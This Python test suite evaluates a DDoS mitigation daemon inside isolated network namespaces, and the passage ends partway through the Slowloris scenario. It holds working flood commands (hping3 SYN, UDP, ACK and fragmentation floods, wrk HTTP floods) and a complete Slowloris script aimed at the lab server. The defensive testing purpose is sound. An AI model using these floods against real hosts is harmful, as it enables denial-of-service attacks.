#!/usr/bin/env python3
"""
Distributed DDoS Mitigation Testing Suite
==========================================
Creates a realistic multi-namespace network topology:
  - 1 server namespace (10.0.0.1) with Nginx + Gunicorn + control_plane.py
  - 40 legitimate client namespaces (10.0.1.1-10.0.1.40) with tc-simulated quality
  - 10 botnet attacker namespaces  (10.0.2.1-10.0.2.10)

Topology:
  All namespaces connect through a Linux bridge (ddos_br0) in the DEFAULT namespace.
  The server's veth_server interface is the XDP attachment point — all bridged
  traffic enters server_ns through this single interface, so the eBPF filter
  sees every packet from every client/attacker.

Usage:
    sudo python3 test_distributed_suite.py
"""

import subprocess
import time
import sys
import os
import threading
import signal
import random
import atexit

import psutil
import csv
import datetime

# ─────────────────────────────── CONFIGURATION ───────────────────────────────

SERVER_IP = "10.0.0.1"
SERVER_NS = "server_ns"
BRIDGE_NAME = "ddos_br0"      # Bridge lives in the DEFAULT namespace

LEGIT_COUNT = 20               # Number of legitimate client namespaces
LEGIT_IP_PREFIX = "10.0.1"     # Legit IPs: 10.0.1.1 – 10.0.1.40

BOTNET_COUNT = 5              # Number of botnet attacker namespaces
BOTNET_IP_PREFIX = "10.0.2"    # Botnet IPs: 10.0.2.1 – 10.0.2.10

SUBNET_MASK = "/16"            # All nodes in 10.0.0.0/16
HTTP_URL = f"http://{SERVER_IP}/"

PROJECT_DIR = "/home/artur/DDoS-mitigation/code"
NGINX_CONF = f"{PROJECT_DIR}/nginx.conf"
CONTROL_PLANE = f"{PROJECT_DIR}/control_plane.py"
PYTHON_VENV = f"{PROJECT_DIR}/venv/bin/python"
LOG_FILE = "/tmp/mitigation_distributed_test.log"

# ─────────────────────────────── ANSI COLORS ─────────────────────────────────

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ────────────────────────── GLOBAL STATE ─────────────────────────────────────

results = []
_all_created_ns = []           # Track for cleanup
_legit_traffic_stop = threading.Event()
_legit_threads = []
_daemon_proc = None


# ═══════════════════════════════════════════════════════════════════════════════
#  SHELL HELPER
# ═══════════════════════════════════════════════════════════════════════════════

def run(cmd, ns=None, bg=False, timeout=None):
    """Execute a shell command, optionally inside a network namespace."""
    full_cmd = []
    if ns:
        full_cmd.extend(["ip", "netns", "exec", ns])
    if isinstance(cmd, str):
        full_cmd.extend(cmd.split())
    else:
        full_cmd.extend(cmd)

    if bg:
        return subprocess.Popen(full_cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    try:
        return subprocess.run(full_cmd, capture_output=True, text=True,
                              timeout=timeout)
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  INFRASTRUCTURE: Namespace & Network Topology Management
# ═══════════════════════════════════════════════════════════════════════════════

def cleanup_all():
    """Delete every namespace, bridge, and process created by this script."""
    global _daemon_proc

    print(f"\n{YELLOW}[*] Cleaning up all namespaces and processes...{RESET}")

    # Kill ALL mitigation-related processes system-wide
    subprocess.run(["pkill", "-9", "-f", "control_plane.py"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "gunicorn"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "nginx: master"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "hping3"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "_dist_"], capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "wrk"], capture_output=True)
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
    _daemon_proc = None
    time.sleep(0.5)
    # Nuclear: find and delete ALL namespaces matching our patterns
    result = subprocess.run(["ip", "netns", "list"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.strip().split("\n"):
            ns = line.split()[0] if line.strip() else ""
            if ns.startswith(("server_ns", "legit_", "bot_")):
                subprocess.run(["ip", "netns", "del", ns],
                               capture_output=True, timeout=10)
    _all_created_ns.clear()
    # Delete the bridge
    subprocess.run(["ip", "link", "del", BRIDGE_NAME],
                   capture_output=True, timeout=5)
    # Also delete orphaned veth interfaces
    result = subprocess.run(["ip", "link", "show"], capture_output=True, text=True)
    if result and result.stdout:
        for line in result.stdout.split("\n"):
            for prefix in ["vo_legit_", "vo_bot_", "veth_srv_br"]:
                if prefix in line:
                    iface = line.split(":")[1].strip().split("@")[0]
                    subprocess.run(["ip", "link", "del", iface],
                                   capture_output=True, timeout=5)

    try:
        # os.remove(LOG_FILE)
        pass
    except FileNotFoundError:
        pass

    print(f"{GREEN}[+] Cleanup complete.{RESET}")


atexit.register(cleanup_all)
signal.signal(signal.SIGINT, lambda s, f: sys.exit(1))
signal.signal(signal.SIGTERM, lambda s, f: sys.exit(1))


def create_host_bridge():
    """Create the central bridge in the DEFAULT (host) namespace.

    All client/attacker namespaces and the server namespace connect here.
    This mimics a LAN switch in a real data center.
    """
    subprocess.run(["ip", "link", "add", BRIDGE_NAME, "type", "bridge"],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", BRIDGE_NAME, "up"],
                   capture_output=True)


def create_server_ns():
    """Create the server namespace and connect it to the host bridge.

    Topology:
        [server_ns]  veth_server  ←── veth pair ──→  veth_srv_br  →  ddos_br0
                     (10.0.0.1)                       (bridge port)

    control_plane.py attaches XDP to veth_server. Because all traffic from
    every client/attacker traverses the bridge and enters server_ns through
    this single veth, XDP sees EVERY ingress packet.
    """
    # Create namespace
    subprocess.run(["ip", "netns", "add", SERVER_NS], capture_output=True)
    _all_created_ns.append(SERVER_NS)

    # Create veth pair: veth_server (→ server_ns) ↔ veth_srv_br (→ host bridge)
    subprocess.run(["ip", "link", "add", "veth_server", "type", "veth",
                    "peer", "name", "veth_srv_br"], capture_output=True)

    # Move server end into server_ns
    subprocess.run(["ip", "link", "set", "veth_server", "netns", SERVER_NS],
                   capture_output=True)

    # Attach host end to the bridge
    subprocess.run(["ip", "link", "set", "veth_srv_br", "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", "veth_srv_br", "up"],
                   capture_output=True)

    # Configure server_ns
    run(f"ip addr add {SERVER_IP}{SUBNET_MASK} dev veth_server", ns=SERVER_NS)
    run("ip link set veth_server up", ns=SERVER_NS)
    run("ip link set lo up", ns=SERVER_NS)

    # Disable checksum offloading (required for XDP on veth)
    run("ethtool -K veth_server tx off rx off", ns=SERVER_NS)


def create_client_ns(ns_name, ip_addr):
    """Create a client/attacker namespace and connect it to the host bridge.

    Topology:
        [ns_name]  veth_in  ←── veth pair ──→  vo_<ns_name>  →  ddos_br0
                   (ip_addr)                    (bridge port)
    """
    veth_inner = "veth_in"
    # Truncate outer name to stay under the 15-char IFNAMSIZ limit
    veth_outer = f"vo_{ns_name[:12]}"

    subprocess.run(["ip", "netns", "add", ns_name], capture_output=True)
    _all_created_ns.append(ns_name)

    # Create veth pair in host namespace
    subprocess.run(["ip", "link", "add", veth_outer, "type", "veth",
                    "peer", "name", veth_inner], capture_output=True)

    # Move inner end into client namespace
    subprocess.run(["ip", "link", "set", veth_inner, "netns", ns_name],
                   capture_output=True)

    # Attach outer end to host bridge
    subprocess.run(["ip", "link", "set", veth_outer, "master", BRIDGE_NAME],
                   capture_output=True)
    subprocess.run(["ip", "link", "set", veth_outer, "up"],
                   capture_output=True)

    # Configure client side
    run(f"ip addr add {ip_addr}{SUBNET_MASK} dev {veth_inner}", ns=ns_name)
    run(f"ip link set {veth_inner} up", ns=ns_name)
    run("ip link set lo up", ns=ns_name)


def apply_tc(ns_name, profile):
    """Apply tc netem to simulate varying network quality.

    Profiles:
      'perfect'    — no shaping (LAN speed)
      'broadband'  — 20ms ±2ms latency
      'mobile_3g'  — 150ms ±40ms latency, 2% loss
      'mobile_bad' — 300ms ±80ms latency, 5% loss, 1% corruption
    """
    dev = "veth_in"
    run(f"tc qdisc del dev {dev} root", ns=ns_name)

    if profile == "perfect":
        return
    elif profile == "broadband":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "20ms", "2ms", "distribution", "normal"], ns=ns_name)
    elif profile == "mobile_3g":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "150ms", "40ms", "distribution", "normal",
             "loss", "2%"], ns=ns_name)
    elif profile == "mobile_bad":
        run(["tc", "qdisc", "add", "dev", dev, "root", "netem",
             "delay", "300ms", "80ms", "distribution", "normal",
             "loss", "5%", "corrupt", "1%"], ns=ns_name)


def start_server_services():
    """Start Nginx, Gunicorn, and the mitigation daemon inside server_ns."""
    global _daemon_proc

    # Prepare logs
    subprocess.run(["mkdir", "-p", "/var/log/nginx"], capture_output=True)
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # SSL certs (reuse if they exist)
    if not os.path.isfile("/etc/ssl/certs/nginx-selfsigned.crt"):
        subprocess.run([
            "openssl", "req", "-x509", "-nodes", "-days", "365",
            "-newkey", "rsa:2048",
            "-keyout", "/etc/ssl/private/nginx-selfsigned.key",
            "-out", "/etc/ssl/certs/nginx-selfsigned.crt",
            "-subj", "/C=PL/ST=Masovian/L=Warsaw/O=PoC/CN=twojadomena.pl"
        ], capture_output=True)

    # Create dummy backend app
    dummy_app = os.path.join(PROJECT_DIR, "dummy_app.py")
    with open(dummy_app, "w") as f:
        f.write(
            'def app(environ, start_response):\n'
            '    data = b"Backend is running flawlessly!\\n"\n'
            '    start_response("200 OK", [\n'
            '        ("Content-Type", "text/plain"),\n'
            '        ("Content-Length", str(len(data)))\n'
            '    ])\n'
            '    return iter([data])\n'
        )

    # Start Gunicorn
    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
         "--workers", "8", "--threads", "4", "-b", "0.0.0.0:8080",
         "dummy_app:app"], ns=SERVER_NS, bg=True)
    time.sleep(1)

    # Start Nginx
    run(["nginx", "-c", NGINX_CONF], ns=SERVER_NS, bg=True)
    time.sleep(0.5)

    # Start mitigation daemon
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    backend = os.environ.get("MITIGATION_BACKEND", "xdp")
    cmd = ["ip", "netns", "exec", SERVER_NS, "env", f"MITIGATION_BACKEND={backend}", PYTHON_VENV, "-u", CONTROL_PLANE]
    log_fd = open(LOG_FILE, "w")
    _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

    # Wait for readiness
    print("[*] Waiting for mitigation daemon to initialize...", end="", flush=True)
    start = time.time()
    ready = False
    while time.time() - start < 60:
        try:
            with open(LOG_FILE, "r") as f:
                if "Listening for Nginx logs" in f.read():
                    ready = True
                    break
        except FileNotFoundError:
            pass
        print(".", end="", flush=True)
        time.sleep(0.5)
    print()

    if not ready:
        print(f"{RED}[!] Daemon did not report ready within 60s!{RESET}")
    else:
        print(f"{GREEN}[+] Mitigation daemon is ready.{RESET}")
        time.sleep(2)


def reset_between_scenarios():
    """Restart daemon + Nginx + Gunicorn to clear ban state between scenarios.

    The control_plane.py keeps banned IPs in memory (BAN_TTL_SECONDS=300).
    Without a full restart, bots banned in Scenario N remain banned in N+1,
    preventing detection of new bans. This function performs a clean restart
    while preserving the network topology (namespaces, bridge, veths).
    """
    global _daemon_proc

    print(f"\n{CYAN}[*] Resetting mitigation environment...{RESET}")
    
    # Kill ALL control_plane.py processes inside server_ns
    run(["pkill", "-9", "-f", "control_plane.py"], ns=SERVER_NS)
    time.sleep(0.5)
    # Explicitly detach XDP from veth_server (in case the orphan left it attached)
    run(["ip", "link", "set", "dev", "veth_server", "xdp", "off"], ns=SERVER_NS)
    # Flush any leftover iptables rules if in comparative baseline mode
    run(["iptables", "-F"], ns=SERVER_NS)
    
    # Kill the running daemon
    if _daemon_proc and _daemon_proc.poll() is None:
        _daemon_proc.kill()
        _daemon_proc.wait()
        _daemon_proc = None

    # Kill Nginx and Gunicorn
    run("pkill -f 'nginx: master process'", ns=SERVER_NS)
    run(["pkill", "-f", "gunicorn"], ns=SERVER_NS)
    time.sleep(0.5)

    # Truncate all log files to clear stale [BAN] entries
    for lf in ["/var/log/nginx/ddos_ml_access.log", "/var/log/nginx/error.log"]:
        open(lf, "w").close()

    # Restart Gunicorn
    run([PYTHON_VENV, "-m", "gunicorn", "--chdir", PROJECT_DIR,
         "--workers", "8", "--threads", "4", "-b", "0.0.0.0:8080",
         "dummy_app:app"], ns=SERVER_NS, bg=True)
    time.sleep(1)

    # Restart Nginx
    run(["nginx", "-c", NGINX_CONF], ns=SERVER_NS, bg=True)
    time.sleep(0.5)

    # Restart mitigation daemon with a fresh log file
    try:
        os.remove(LOG_FILE)
    except FileNotFoundError:
        pass

    backend = os.environ.get("MITIGATION_BACKEND", "xdp")
    cmd = ["ip", "netns", "exec", SERVER_NS, "env", f"MITIGATION_BACKEND={backend}", PYTHON_VENV, "-u", CONTROL_PLANE]
    log_fd = open(LOG_FILE, "w")
    _daemon_proc = subprocess.Popen(cmd, stdout=log_fd, stderr=subprocess.STDOUT)

    # Wait for readiness
    start = time.time()
    while time.time() - start < 30:
        try:
            with open(LOG_FILE, "r") as f:
                if "Listening for Nginx logs" in f.read():
                    break
        except FileNotFoundError:
            pass
        time.sleep(0.5)
    else:
        print(f"{RED}[!] Daemon did not restart within 30s!{RESET}")
        return

    time.sleep(1)
    print(f"{GREEN}[+] Environment reset complete.{RESET}")


def build_topology():
    """Build the full test topology: bridge + server + legit + botnet."""
    legit_nodes = []     # [(ns_name, ip_addr, profile)]
    botnet_nodes = []    # [(ns_name, ip_addr)]

    # Clean any leftover state from a previous run
    cleanup_all()

    print(f"\n{BOLD}{CYAN}[*] Building network topology...{RESET}")

    create_host_bridge()
    create_server_ns()

    # ── Legitimate clients ──
    print(f"{CYAN}[*] Creating {LEGIT_COUNT} legitimate client namespaces...{RESET}")
    profiles = ["perfect", "broadband", "mobile_3g", "mobile_bad"]
    weights  = [0.30, 0.35, 0.25, 0.10]

    for i in range(1, LEGIT_COUNT + 1):
        ns  = f"legit_{i}"
        ip  = f"{LEGIT_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        profile = random.choices(profiles, weights=weights, k=1)[0]
        apply_tc(ns, profile)
        legit_nodes.append((ns, ip, profile))

    print(f"{GREEN}[+] Legitimate clients ready. Profile distribution:{RESET}")
    for p in profiles:
        cnt = sum(1 for _, _, pr in legit_nodes if pr == p)
        print(f"    {p}: {cnt} nodes")

    # ── Botnet ──
    print(f"{CYAN}[*] Creating {BOTNET_COUNT} botnet attacker namespaces...{RESET}")
    for i in range(1, BOTNET_COUNT + 1):
        ns = f"bot_{i}"
        ip = f"{BOTNET_IP_PREFIX}.{i}"
        create_client_ns(ns, ip)
        botnet_nodes.append((ns, ip))

    print(f"{GREEN}[+] Botnet ready: {len(botnet_nodes)} nodes.{RESET}")

    # ── Server services ──
    start_server_services()

    return legit_nodes, botnet_nodes


# ═══════════════════════════════════════════════════════════════════════════════
#  LEGITIMATE BACKGROUND TRAFFIC
# ═══════════════════════════════════════════════════════════════════════════════

def _legit_worker(ns_name, ip_addr, profile):
    """Background thread: sends periodic HTTP requests from a legitimate ns."""
    base_interval = {"perfect": 1.5, "broadband": 2.0,
                     "mobile_3g": 3.0, "mobile_bad": 5.0}.get(profile, 2.0)

    while not _legit_traffic_stop.is_set():
        try:
            run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "--max-time", "10", HTTP_URL], ns=ns_name, timeout=15)
        except Exception:
            pass
        jitter = random.uniform(-0.5, 1.0)
        _legit_traffic_stop.wait(max(0.5, base_interval + jitter))


def start_legit_traffic(legit_nodes):
    """Start background HTTP traffic from all legitimate client namespaces."""
    _legit_traffic_stop.clear()
    for ns, ip, profile in legit_nodes:
        t = threading.Thread(target=_legit_worker, args=(ns, ip, profile),
                             daemon=True)
        t.start()
        _legit_threads.append(t)
    print(f"[+] Started background traffic from {len(legit_nodes)} legitimate users.")


def stop_legit_traffic():
    """Signal all legitimate traffic threads to stop."""
    _legit_traffic_stop.set()
    for t in _legit_threads:
        t.join(timeout=3)
    _legit_threads.clear()


# ═══════════════════════════════════════════════════════════════════════════════
#  VERIFICATION HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def is_ip_banned(ns_name):
    """Check if an IP is blocked by XDP by pinging the server from its ns."""
    res = run(f"ping -c 2 -W 2 {SERVER_IP}", ns=ns_name, timeout=10)
    if res is None:
        return True
    return res.returncode != 0


def tail_logs_for_bans(target_ips, timeout=25):
    """Watch the daemon log for [BAN] entries matching any of the target IPs.

    Returns: dict {ip: (engine, ttm)}
    """
    start_time = time.time()
    found = {}
    remaining = set(target_ips)

    while time.time() - start_time < timeout and remaining:
        try:
            with open(LOG_FILE, "r") as f:
                for line in f:
                    if "[BAN]" not in line:
                        continue
                    for ip in list(remaining):
                        if ip in line:
                            engine = _classify_engine(line)
                            found[ip] = (engine, time.time() - start_time)
                            remaining.discard(ip)
        except FileNotFoundError:
            pass
        if remaining:
            time.sleep(0.5)

    for ip in remaining:
        found[ip] = ("None", None)

    return found


def _classify_engine(line):
    """Classify the detection engine from a [BAN] log line."""
    if "SYN flood" in line:
        return "L4 SYN"
    if "UDP" in line:
        return "L4 UDP"
    if "R.U.D.Y." in line:
        return "L7 R.U.D.Y."
    if "Slow connection" in line:
        return "L4 SlowConn"
    if "Heuristic" in line:
        return "L7 Heuristic"
    if "GRU" in line:
        return "GRU ML"
    return "Unknown"



def capture_metrics(scenario, phase):
    try:
        # 1. CPU & RAM
        cpu_total = psutil.cpu_percent(interval=None)
        mem_total = psutil.virtual_memory().used / (1024 * 1024)
        
        daemon_cpu = 0.0
        daemon_ram = 0.0
        nginx_cpu = 0.0

        for p in psutil.process_iter(['name', 'cmdline']):
            try:
                cmdline = ' '.join(p.info['cmdline'] or [])
                if "control_plane.py" in cmdline and "ip netns exec" not in cmdline:
                    daemon_cpu += p.cpu_percent(interval=None)
                    daemon_ram += p.memory_info().rss / (1024 * 1024)
                elif "nginx: worker process" in cmdline:
                    nginx_cpu += p.cpu_percent(interval=None)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass

        # 2. TCP State (Server NS)
        tcp_estab = tcp_tw = tcp_syn = 0
        ss_res = run(["ss", "-tan"], ns=SERVER_NS)
        if ss_res and ss_res.stdout:
            tcp_estab = ss_res.stdout.count("ESTAB")
            tcp_tw = ss_res.stdout.count("TIME-WAIT")
            tcp_syn = ss_res.stdout.count("SYN-RECV")

        # 3. Throughput (PPS/Bps)
        def read_stats():
            try:
                res_p = run(["cat", "/sys/class/net/veth_server/statistics/rx_packets"], ns=SERVER_NS)
                res_b = run(["cat", "/sys/class/net/veth_server/statistics/rx_bytes"], ns=SERVER_NS)
                rx_p = int(res_p.stdout.strip())
                rx_b = int(res_b.stdout.strip())
                return rx_p, rx_b
            except:
                return 0, 0
                
        rx_p1, rx_b1 = read_stats()
        time.sleep(1.0)
        rx_p2, rx_b2 = read_stats()
        
        pps = rx_p2 - rx_p1
        bps = rx_b2 - rx_b1
        
        # 4. Save to CSV
        backend = os.environ.get("MITIGATION_BACKEND", "xdp")
        csv_file = "/tmp/metrics_iptables.csv" if backend == "iptables" else "/tmp/mitigation_performance.csv"
        file_exists = os.path.isfile(csv_file)
        with open(csv_file, "a", newline='') as f:
            writer = csv.writer(f)
            if not file_exists:
                writer.writerow(["Timestamp", "Scenario", "Phase", "CPU_Total_Pct", 
                                 "CPU_Daemon_Pct", "CPU_Nginx_Pct", "RAM_Total_MB", 
                                 "RAM_Daemon_MB", "TCP_Estab", "TCP_TimeWait", 
                                 "TCP_SynRecv", "PPS_Rx", "Bps_Rx"])
            writer.writerow([
                datetime.datetime.now().isoformat(),
                scenario, phase,
                f"{cpu_total:.1f}", f"{daemon_cpu:.1f}", f"{nginx_cpu:.1f}",
                f"{mem_total:.1f}", f"{daemon_ram:.1f}",
                tcp_estab, tcp_tw, tcp_syn, pps, bps
            ])
            
    except Exception as e:
        print(f"Error capturing metrics: {e}")


def check_collateral_damage(legit_nodes):
    """Verify that NO legitimate user IP is banned.

    Returns: (ok: bool, banned_list: [(ip, profile)])
    """
    banned_legit = []
    for ns, ip, profile in legit_nodes:
        if is_ip_banned(ns):
            banned_legit.append((ip, profile))
    return (len(banned_legit) == 0), banned_legit


def verify_legit_http(legit_nodes, sample_size=15):
    """Verify HTTP connectivity from a random sample of legitimate users.

    Returns: (success, fail, total)
    """
    sample = random.sample(legit_nodes, min(sample_size, len(legit_nodes)))
    success = fail = 0
    for ns, ip, _ in sample:
        success_for_this = False
        for attempt in range(3):
            res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                       "--max-time", "15", HTTP_URL], ns=ns, timeout=20)
            if res and res.stdout.strip() == "200":
                success_for_this = True
                break
            time.sleep(1)
            
        if success_for_this:
            success += 1
        else:
            fail += 1
    return success, fail, len(sample)


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def launch_botnet(botnet_nodes, cmd_func):
    """Launch an attack from every botnet node concurrently.

    cmd_func(ns, ip) → subprocess.Popen or None.
    Returns list of (proc, ns, ip).
    """
    procs = []
    for ns, ip in botnet_nodes:
        p = cmd_func(ns, ip)
        if p:
            procs.append((p, ns, ip))
    return procs


def kill_procs(procs):
    """Kill all attack processes."""
    for p, ns, _ in procs:
        try:
            p.kill()
            p.wait(timeout=2)
        except Exception:
            pass
        run("pkill -9 -f hping3", ns=ns)
        run("pkill -9 -f wrk", ns=ns)
        run("pkill -9 -f _dist_", ns=ns)


def _write_script(path, content):
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o755)


# ═══════════════════════════════════════════════════════════════════════════════
#  REPORT
# ═══════════════════════════════════════════════════════════════════════════════

def report(name, ban_results, botnet_nodes, legit_nodes):
    """Evaluate and display results for a distributed attack scenario."""
    botnet_ips = [ip for _, ip in botnet_nodes]
    banned_cnt = sum(1 for ip in botnet_ips if ban_results[ip][0] != "None")
    total = len(botnet_ips)

    ttm_vals = [ban_results[ip][1] for ip in botnet_ips
                if ban_results[ip][1] is not None]
    avg_ttm = sum(ttm_vals) / len(ttm_vals) if ttm_vals else None

    engines = set(ban_results[ip][0] for ip in botnet_ips
                  if ban_results[ip][0] != "None")

    col_ok, col_list = check_collateral_damage(legit_nodes)
    http_ok, http_fail, http_total = verify_legit_http(legit_nodes)

    eff_pass  = banned_cnt >= total * 0.8
    col_pass  = col_ok
    http_pass = http_fail == 0
    overall   = eff_pass and col_pass and http_pass

    tag = f"{GREEN}PASS{RESET}" if overall else f"{RED}FAIL{RESET}"

    print(f"\n  [{tag}] {BOLD}{name}{RESET}")
    print(f"  ├── Botnet banned:     {banned_cnt}/{total} "
          f"({'✅' if eff_pass else '❌'})")
    if avg_ttm is not None:
        print(f"  ├── Avg TTM:           {avg_ttm:.2f}s")
    else:
        print(f"  ├── Avg TTM:           N/A")
    print(f"  ├── Engines:           {', '.join(engines) if engines else 'None'}")
    print(f"  ├── Legit HTTP:        {http_ok}/{http_total} OK "
          f"({'✅' if http_pass else '❌'})")
    fp_str = "None ✅" if col_pass else f"{len(col_list)} BANNED ❌"
    print(f"  └── False Positives:   {fp_str}")
    if col_list:
        for lip, lprof in col_list:
            print(f"       └── FP: {lip} (profile: {lprof})")

    results.append({
        "scenario": name,
        "banned": f"{banned_cnt}/{total}",
        "avg_ttm": f"{avg_ttm:.2f}s" if avg_ttm else "N/A",
        "engines": ", ".join(engines) if engines else "None",
        "fp": "Clean" if col_pass else f"{len(col_list)} FP",
        "result": "PASS" if overall else "FAIL",
    })


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK SCENARIOS
# ═══════════════════════════════════════════════════════════════════════════════

def scenario_syn_flood(botnet, legit):
    """S1: Distributed high-rate SYN flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 1: Distributed SYN Flood (1000 SYN/s per bot)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed SYN Flood", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed SYN Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
    capture_metrics("Distributed SYN Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed SYN Flood", bans, botnet, legit)


def scenario_slow_syn(botnet, legit):
    """S2: Distributed low-and-slow SYN flood (10 SYN/s — GRU ML target)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 2: Distributed Low & Slow SYN (GRU ML Target)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Low & Slow SYN", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed Low & Slow SYN", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=30)
    capture_metrics("Distributed Low & Slow SYN", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed Low & Slow SYN", bans, botnet, legit)


def scenario_udp_flood(botnet, legit):
    """S3: Distributed high-rate UDP flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 3: Distributed UDP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed UDP Flood", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed UDP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
    capture_metrics("Distributed UDP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed UDP Flood", bans, botnet, legit)


def scenario_http_flood(botnet, legit):
    """S4: Distributed HTTP flood using wrk."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 4: Distributed HTTP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed HTTP Flood", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed HTTP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=15)
    capture_metrics("Distributed HTTP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed HTTP Flood", bans, botnet, legit)


def scenario_ack_flood(botnet, legit):
    """S5: Distributed ACK flood (TCP state exhaustion)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 5: Distributed ACK Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed ACK Flood", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -A -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed ACK Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
    capture_metrics("Distributed ACK Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed ACK Flood", bans, botnet, legit)


def scenario_fragmentation(botnet, legit):
    """S6: Distributed IP fragmentation flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 6: Distributed IP Fragmentation Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 1: Baseline")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}",
            ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10)
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    time.sleep(3)
    report("Distributed Fragmentation", bans, botnet, legit)


def scenario_slowloris(botnet, legit):
    """S7: Distributed Slowloris from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 7: Distributed Slowloris")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Slowloris", "Phase 1: Baseline")

    script = "/tmp/_dist_slowloris.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 8; SLEEP = 5; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"GET /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: SL\\r\\nAccept-language: en\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(f"X-a: {{random.randint(1,9999)}}\\r\\n".encode())
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    time.sleep(1.5)
    capture_metrics("Distributed Slowloris", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40)
